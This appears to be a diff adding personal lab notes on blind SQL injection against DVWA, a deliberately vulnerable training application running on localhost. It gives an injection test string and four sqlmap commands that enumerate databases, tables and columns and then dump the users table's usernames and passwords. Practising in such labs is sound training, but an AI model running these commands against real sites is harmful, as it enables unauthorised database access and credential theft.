@@ -1,0 +1,18 @@
+Check Error= 1' or 1=1#
+
+capture Req
+
+Available Database= 
+sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=6d3c4eaed157f16218889a8e4ddd30a7" --dbs --batch --risk=3 --level=3
+
+
+Show database tables=
+sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=6d3c4eaed157f16218889a8e4ddd30a7" -D dvwa --tables --batch --risk=3 --level=3
+
+
+show table users columns=
+sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=6d3c4eaed157f16218889a8e4ddd30a7" -D dvwa -T users --columns --batch --risk=3 --level=3
+
+
+Show username and passwords=
+sqlmap -u "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=6d3c4eaed157f16218889a8e4ddd30a7" -D dvwa -T users -C user,password --dump --batch --risk=3 --level=3
